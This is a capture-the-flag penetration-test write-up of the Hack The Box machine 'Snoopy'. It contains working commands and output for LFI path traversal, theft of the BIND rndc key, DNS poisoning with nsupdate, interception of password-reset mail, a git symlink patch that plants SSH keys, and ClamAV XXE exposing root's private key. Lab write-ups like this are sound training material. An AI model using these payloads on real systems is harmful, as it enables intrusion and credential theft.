
+++
title = "Snoopy-CPTS-Prep-Box-Writeup.md"
date = 2026-02-21T00:00:00Z
draft = false
description = "Snoopy is a hard-difficulty Linux machine featuring LFI vulnerability, BIND9 DNS manipulation, Mattermost password reset interception, SSH honeypot credential capture, git symlink attack for privilege escalation, and CVE-2023-20052 (ClamAV XXE) for root compromise"
tags = ["CPTS", "HTB", "Snoopy", "CPTS Prep", "Linux", "LFI", "DNS Poisoning", "Mattermost", "SSH Honeypot", "Git Symlink", "ClamAV", "CVE-2023-20052", "XXE"]
+++

## Executive Summary

During December 2025, a simulated penetration test was conducted against the Linux host "Snoopy" (`10.129.229.5`). The objective was to evaluate the security posture of the target and identify potential escalation paths to root-level privileges.

The assessment successfully demonstrated a complete attack chain, moving from initial reconnaissance to root compromise. The following key findings were identified:

- **LFI Vulnerability:** The web application on port 80 was vulnerable to Local File Inclusion, allowing arbitrary file reads. This was used to extract the BIND9 DNS configuration and the `rndc.key` secret.

- **DNS Manipulation:** Using the extracted `rndc.key`, DNS zone updates were performed to redirect the `mail.snoopy.htb` subdomain to an attacker-controlled IP address.

- **Mattermost Password Reset Interception:** The DNS redirection caused password reset emails from Mattermost to be sent to the attacker's SMTP server, revealing reset tokens and granting access to the Mattermost instance.

- **SSH Honeypot Credential Capture:** Within Mattermost, a custom plugin allowed web admins to log into remote servers. This functionality was abused by directing the admin to an attacker-controlled SSH honeypot, capturing credentials for user `cbrown`.

- **Git Symlink Privilege Escalation:** User `cbrown` had sudo privileges to run `git apply` as `sbrown`. A symlink vulnerability in Git (CVE-2023-25652) was exploited to write an SSH key into `sbrown`'s authorized_keys file, gaining access as `sbrown`.

- **ClamAV XXE Exploitation (CVE-2023-20052):** User `sbrown` had sudo privileges to run `clamscan` with debug mode on files in a specific directory. A crafted DMG file exploiting CVE-2023-20052 was used to trigger an XXE vulnerability, causing ClamAV to read the root user's SSH private key and output it in the debug logs.

- **Root Compromise:** The extracted root SSH key was used to authenticate as root, achieving full system compromise.

**Impact:**  
This chain of exploits resulted in complete compromise of the target system. An attacker with no prior access was able to escalate to root privileges by chaining together LFI, DNS manipulation, credential interception, Git symlink abuse, and an XXE vulnerability in ClamAV.

**Recommendations:**

- **Secure File Inclusion:** Implement proper input validation to prevent LFI vulnerabilities. Avoid using user input directly in file paths.
- **Protect DNS Keys:** Restrict access to DNS configuration files and use strong secrets for dynamic DNS updates.
- **Secure Email Handling:** Implement proper email validation and consider using time-limited, single-use tokens for password resets.
- **Audit sudo Permissions:** Restrict sudo access to git commands and other potentially dangerous executables.
- **Patch ClamAV:** Update ClamAV to a version patched against CVE-2023-20052. Implement proper XML parsing protections.
- **Principle of Least Privilege:** Regularly audit user privileges and remove unnecessary access rights.

## About

Snoopy is a Hard Difficulty Linux machine that involves the exploitation of an LFI vulnerability to extract the configuration secret of `Bind9`. The obtained secret allows the redirection of the `mail` subdomain to the attacker's IP address, facilitating the interception of password reset requests within the `Mattermost` chat client. Within that service, a custom plugin designed for web admins to log into remote servers is manipulated to direct them to a server set up as an `SSH honeypot`, leading to the interception of `cbrown`'s credentials. Exploiting the privileges of `cbrown`, the attacker utilizes the ability to execute `git apply` as `sbrown`, resulting in a unique symlinking attack for privilege escalation. The final stage involves the abuse of `CVE-2023-20052` to include the `root` user's `SSH` key into a file via `XXE`, with the payload scanned by `clamscan` to trigger the `XXE` output in the debug response.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with a comprehensive port scan of the target to identify all accessible services.

```bash
nmap -p- --min-rate 10000 10.129.229.5
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-09 13:13 EDT
Nmap scan report for 10.129.229.5
Host is up (0.085s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds

nmap -p 22,53,80 -sCV 10.129.229.5
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-09 13:18 EDT
Nmap scan report for 10.129.229.5
Host is up (0.084s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds
```
**Findings:** The scan revealed three open ports: SSH (22/tcp), DNS (53/tcp) running ISC BIND 9.18.12, and HTTP (80/tcp) running nginx 1.18.0.

**2. DNS Enumeration**  
DNS queries were performed to gather information about the domain.
```bash
❯ dig @snoopy.htb 10.129.229.5

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> @snoopy.htb 10.129.229.5
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 3165
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 0a8fb210f9e2230801000000692e7b7f74cb62a6f9204f2e (good)
; EDE: 18 (Prohibited)
;; QUESTION SECTION:
;10.129.229.5.                  IN      A

;; Query time: 90 msec
;; SERVER: 10.129.229.5#53(snoopy.htb) (UDP)
;; WHEN: Tue Dec 02 12:39:09 +07 2025
;; MSG SIZE  rcvd: 75

❯ dig axfr snoopy.htb @10.129.229.5

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> axfr snoopy.htb @10.129.229.5
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 390 msec
;; SERVER: 10.129.229.5#53(10.129.229.5) (TCP)
;; WHEN: Tue Dec 02 12:39:21 +07 2025
;; XFR size: 11 records (messages 1, bytes 325)


 /home/h/HTB/C/Snoopy/03-Attack-Chains   
```

**Findings:** A successful zone transfer revealed several subdomains:

- `mattermost.snoopy.htb` - 172.18.0.3
    
- `mm.snoopy.htb` - 127.0.0.1
    
- `postgres.snoopy.htb` - 172.18.0.2
    
- `provisions.snoopy.htb` - 172.18.0.4
    
- `www.snoopy.htb` - 127.0.0.1
    

### Phase 2: LFI Vulnerability Exploitation

**3. LFI Discovery**  
The web application at `snoopy.htb` had a download functionality that was tested for Local File Inclusion.
```bash 
❯ ffuf -u http://snoopy.htb/download\?file\=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -fw 1

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snoopy.htb/download?file=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 716ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 710ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 726ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 739ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 759ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 756ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 769ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 786ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 869ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 859ms]
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 850ms]
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 863ms]
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 893ms]
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 766ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 783ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 799ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 799ms]
....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 766ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 986ms]
:: Progress: [922/922] :: Job [1/1] :: 79 req/sec :: Duration: [0:00:13] :: Errors: 0 ::

 /home/h/HTB/C/Snoopy/03-Attack-Chains   
```

**Findings:** Multiple payloads succeeded in reading files, confirming an LFI vulnerability.

**4. /etc/passwd Extraction**  
The LFI was used to read the `/etc/passwd` file.

```bash 
curl http://snoopy.htb/download?file=....//....//....//....//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
bind:x:108:113::/var/cache/bind:/usr/sbin/nologin
_laurel:x:999:998::/var/log/laurel:/bin/false
```
**Findings:** Several users were identified including `cbrown`, `sbrown`, `clamav`, and others.

**5. BIND9 Configuration Extraction**  
The LFI was used to read BIND9 configuration files to locate the DNS update key.
```bash
curl http://snoopy.htb/download?file=....//....//....//....//etc/bind/rndc.key
```

**Findings:** The `rndc.key` file contained the HMAC-SHA256 secret for dynamic DNS updates:

```bash 
❯ cat poison_dns.txt
server 10.129.229.5
zone snoopy.htb
update add mail.snoopy.htb 86400 IN A 10.10.16.12
send
❯ cat rndc.key
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};

 /home/honeypoop/HTB/CPTS-Prep/Snoopy   
```

### Phase 3: DNS Manipulation

**6. DNS Update Payload Creation**  
A DNS update request was crafted to redirect `mail.snoopy.htb` to the attacker's IP.

**7. DNS Update Execution**  
The update was sent using nsupdate with the extracted key.

```bash 
❯ nsupdate -k rndc.key poison_dns.txt
```


**8. DNS Verification**  
The new DNS record was verified.
```bash
dig mail.snoopy.htb +noall +answer @10.129.229.5
❯ dig mail.snoopy.htb +noall +answer @10.129.229.5
mail.snoopy.htb.        86400   IN      A       10.10.16.12
```
**Findings:** The mail subdomain now resolved to the attacker's IP: `10.10.16.12`.

### Phase 4: Mattermost Password Reset Interception

**9. SMTP Server Setup**  
A Python SMTP debug server was started to intercept password reset emails.
```bash
❯ python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25
/usr/lib/python3.11/smtpd.py:96: DeprecationWarning: The asyncore module is deprecated and will be removed in Python 3.12. The recommended replacement is asyncio
  import asyncore
/usr/lib/python3.11/smtpd.py:97: DeprecationWarning: The asynchat module is deprecated and will be removed in Python 3.12. The recommended replacement is asyncio
  import asynchat
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'Precedence: bulk'
b'Message-ID: <7giqfwq8c9r9met3-1764660684@mm.snoopy.htb>'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'Content-Transfer-Encoding: 8bit'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'Date: Tue, 02 Dec 2025 07:31:24 +0000'
b'To: cschultz@snoopy.htb'
b'Subject: [Mattermost] Reset your password'
b'Auto-Submitted: auto-generated'
b'Content-Type: multipart/alternative;'
b' boundary=470799a1923d3b3268b4cadb05f81586082adaa66e0b1c88169f66d44338'
b'X-Peer: 10.129.229.5'
b''
b'--470799a1923d3b3268b4cadb05f81586082adaa66e0b1c88169f66d44338'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dzy368='
b'b7nk9w7wenmmxaaxfsmd6uuehxr5ackmxmwohzktdfnh9iiino1oyppi39r )'
b''
b'The password reset link expires in 24 hours.'
b''
b'Questions?'
b'Need help or have questions? Email us at support@snoopy.htb ( support@snoop='
b'y.htb )'
b''
b'=C2=A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA='
b', 94301'
b'--470799a1923d3b3268b4cadb05f81586082adaa66e0b1c88169f66d44338'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/html; charset=UTF-8'
b''
b''
b''
b''
b'<!doctype html>'
b'<html xmlns=3D"http://www.w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microso='
b'ft-com:vml" xmlns:o=3D"urn:schemas-microsoft-com:office:office">'
b''
b'<head>'
b'  <title>'
b'  </title>'

```

**10. Password Reset Trigger**  
The password reset functionality at `mm.snoopy.htb` was triggered for a user.

**11. Email Interception**  
The SMTP server received the password reset email containing a token.

```bash
 ---------- MESSAGE FOLLOWS ----------
Subject: [Mattermost] Reset your password
Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=<REDACTED> )

```

**12. Mattermost Access**  
The token was used to reset the password and gain access to the Mattermost instance.

### Phase 5: SSH Honeypot Credential Capture

**13. Honeypot Setup**  
A Cowrie SSH honeypot was deployed in a Docker container to capture credentials.


```bash 
docker run -p 2222:2222 cowrie/cowrie:latest

2025-12-02T08:14:46+0000 [-] Ready to accept SSH connections
2025-12-02T08:16:41+0000 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1
2025-12-02T08:16:41+0000 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256
2025-12-02T08:16:41+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 10.129.229.5:60004 (172.17.0.2:2222) [session: fae52a78125a]
2025-12-02T08:16:41+0000 [HoneyPotSSHTransport,0,10.129.229.5] Remote SSH version: SSH-2.0-paramiko_3.1.0
2025-12-02T08:16:42+0000 [HoneyPotSSHTransport,0,10.129.229.5] SSH client hassh fingerprint: a704be057881f0b1d623cd263e477a8b
2025-12-02T08:16:42+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-ed25519'
2025-12-02T08:16:42+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
2025-12-02T08:16:42+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
2025-12-02T08:16:42+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
2025-12-02T08:16:42+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
2025-12-02T08:16:42+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' trying auth b'password'
2025-12-02T08:16:42+0000 [HoneyPotSSHTransport,0,10.129.229.5] Could not read etc/userdb.txt, default database activated
2025-12-02T08:16:42+0000 [HoneyPotSSHTransport,0,10.129.229.5] login attempt [b'cbrown'/b'sn00pedcr3dential!!!'] failed

```

**14. Plugin Manipulation**  
Within Mattermost, a custom plugin allowed web admins to log into remote servers. The plugin was configured to connect to the attacker's honeypot.

**15. Credential Capture**  
The honeypot logs captured the login attempt.

```bash
2025-12-02T08:16:42+0000 [HoneyPotSSHTransport,0,10.129.229.5] login attempt [b'cbrown'/b'<REDACTED>'] failed
```

**Findings:** The password for user `cbrown` was captured: `<REDACTED>`.

### Phase 6: Initial Shell as cbrown

**16. SSH Access**  
The captured credentials were used to SSH into the target as `cbrown`.
```bash 
❯ ssh cbrown@10.129.229.5

The authenticity of host '10.129.229.5 (10.129.229.5)' can't be established.
ED25519 key fingerprint is SHA256:XCYXaxdk/Kqjbrpe8gktW9N6/6egnc+Dy9V6SiBp4XY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.5' (ED25519) to the list of known hosts.
cbrown@10.129.229.5's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
cbrown@snoopy:~$ ls
cbrown@snoopy:~$ pwd
/home/cbrown
cbrown@snoopy:~$ cd ../
cbrown@snoopy:/home$ ls
cbrown  sbrown
cbrown@snoopy:/home$ cd sbrown/
-bash: cd: sbrown/: Permission denied

```

**17. User Enumeration**  
Basic enumeration was performed to understand the environment.
```bash
cbrown@snoopy:/home$ ls
cbrown  sbrown
cbrown@snoopy:/home$ cd ../
cbrown@snoopy:/$ ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
cbrown@snoopy:/$ ls -la
total 80
drwxr-xr-x  19 root root  4096 Apr 25  2023 .
drwxr-xr-x  19 root root  4096 Apr 25  2023 ..
-rw-------   1 root root    19 Apr 25  2023 .bash_history
-rw-------   1 root root   792 Apr 25  2023 .viminfo
lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
drwxr-xr-x   4 root root  4096 May  2  2023 boot
drwxr-xr-x  19 root root  4000 Dec  2 05:36 dev
drwxr-xr-x  94 root root  4096 May  7  2023 etc
drwxr-xr-x   4 root root  4096 Mar 19  2023 home
lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Feb 24  2023 lost+found
drwxr-xr-x   2 root root  4096 Feb 17  2023 media
drwxr-xr-x   2 root root  4096 Feb 17  2023 mnt
drwxr-xr-x   3 root root  4096 Feb 25  2023 opt
dr-xr-xr-x 298 root root     0 Dec  2 05:36 proc
drwx------   7 root root  4096 Dec  2 05:36 root
drwxr-xr-x  26 root root   900 Dec  2 08:07 run
lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Feb 24  2023 snap
drwxr-xr-x   2 root root  4096 Feb 17  2023 srv
dr-xr-xr-x  13 root root     0 Dec  2 05:36 sys
drwxrwxrwt  12 root root  4096 Dec  2 08:08 tmp
drwxr-xr-x  14 root root  4096 Feb 17  2023 usr
drwxr-xr-x  14 root root  4096 May  7  2023 var
cbrown@snoopy:/$ sudo -l
[sudo] password for cbrown:
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
cbrown@snoopy:/$

```
**Findings:** User `cbrown` had sudo privileges to run a specific git command as user `sbrown`:
```bash
(sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```


### Phase 7: Git Symlink Privilege Escalation

**18. Vulnerability Research**  
Research revealed a Git vulnerability (CVE-2023-25652) involving symlink handling during patch application. When a patch renames a symlink and then writes to a path under that renamed symlink, it can write to arbitrary locations.
https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/

**19. PoC Preparation**  
A proof of concept was created to exploit the vulnerability.

```bash
cd /dev/shm
mkdir poc
cd poc
git init
ln -s /home/cbrown/ symlink
git add symlink
git commit -m "add symlink"
```

**20. Patch Creation**  
A patch was created to rename the symlink and write to a file under the new path.

```bash
vim patch
```

```
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/0xdf
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/0xdf
@@ -0,0 +1,1 @@
+busted
```


**21. Patch Application**  
The patch was applied, demonstrating the ability to write to arbitrary locations.
```bash
git apply patch
cat ~/0xdf
```
**Findings:** The file `0xdf` was created in `cbrown`'s home directory, confirming the vulnerability.

### Phase 8: SSH Key Injection for sbrown

**22. SSH Key Generation**  
An SSH key pair was generated on the attacker's machine.
```bash
ssh-keygen -t rsa -f sbrown_key -C "root@parrot"
```

**23. Target Directory Setup**  
A new Git repository was created targeting `sbrown`'s `.ssh` directory.

```bash
cd /dev/shm
mkdir ssh
cd ssh
git init
ln -s /home/sbrown/.ssh symlink
git add symlink
git commit -m "add symlink"

cbrown@snoopy:/dev/shm$ mkdir poc
cbrown@snoopy:/dev/shm$ cd poc/
cbrown@snoopy:/dev/shm/poc$ git init
Initialized empty Git repository in /dev/shm/poc/.git/
cbrown@snoopy:/dev/shm/poc$ ln -s /home/cbrown/ symlink
cbrown@snoopy:/dev/shm/poc$ git add symlink
cbrown@snoopy:/dev/shm/poc$ git commit -m "add symlink"
[main (root-commit) 66c2bdd] add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 symlink
cbrown@snoopy:/dev/shm/poc$ vim patch
```

**24. Malicious Patch Creation**  
A patch was crafted to write the public key to `authorized_keys`.

```bash
vim patch

diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxqvzofKBn<REDACTED> root@parrot
```


**25. Sudo Execution**  
The patch was applied with sudo privileges as `sbrown`.
```bash
chmod 777 /dev/shm/ssh/
cd /dev/shm/ssh
sudo -u sbrown git apply -v patch
```

**26. SSH Access as sbrown**  
The private key was used to SSH into the target as `sbrown`.
```bash
ssh -i sbrown_key sbrown@10.129.229.5
❯ ssh -i sbrown sbrown@10.129.229.5
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

sbrown@snoopy:~$
sbrown@snoopy:~$


sbrown@snoopy:~$
sbrown@snoopy:~$ ls
scanfiles  user.txt
sbrown@snoopy:~$ cat user.txt
<REDACTED>
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
sbrown@snoopy:~$

```


**27. User Flag Retrieval**  
The user flag was retrieved from `sbrown`'s home directory.

```bash
ls
cat user.txt
```

### Phase 9: ClamAV XXE Exploitation (CVE-2023-20052)

**28. Sudo Privilege Enumeration**  
The sudo privileges for `sbrown` were examined.

```bash
sudo -l
```

**Findings:** User `sbrown` had sudo privileges to run `clamscan` with debug mode on specific files:

```text
(root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```


**29. Vulnerability Research**  
Research revealed CVE-2023-20052, an XXE vulnerability in ClamAV that could be triggered by scanning a specially crafted DMG file. The vulnerability causes ClamAV to include external entities and output the result in debug logs.

**30. Payload Preparation**  
A malicious DMG file was created following the GitHub PoC that triggers the XXE to read the root user's SSH private key.

**31. Payload Transfer**  
The crafted DMG file was transferred to the target's `scanfiles` directory.


```bash
# Transfer c.dmg to /home/sbrown/scanfiles/
```

**32. ClamAV Execution**  
The DMG file was scanned with debug mode enabled.

```bash
sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/c.dmg
```

**33. Root SSH Key Extraction**  
The debug output contained the root user's SSH private key, embedded within the DMG parsing.

```bash
LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<REDACTED>
-----END OPENSSH PRIVATE KEY-----
```

**34. Root SSH Access**  
The extracted private key was saved and used to authenticate as root.

```bash
chmod 600 root_key
ssh -i root_key root@10.129.229.5
```

### Phase 10: Root Flag Retrieval

**35. Root Flag**  
With root access achieved, the root flag was retrieved.

```bash
cat /root/root.txt
```

**Findings:** The root flag was successfully retrieved: `<REDACTED_ROOT_FLAG>`.

## Key Takeaways

- **LFI to DNS Poisoning:** Local File Inclusion can expose sensitive configuration files like DNS keys, enabling DNS manipulation.
    
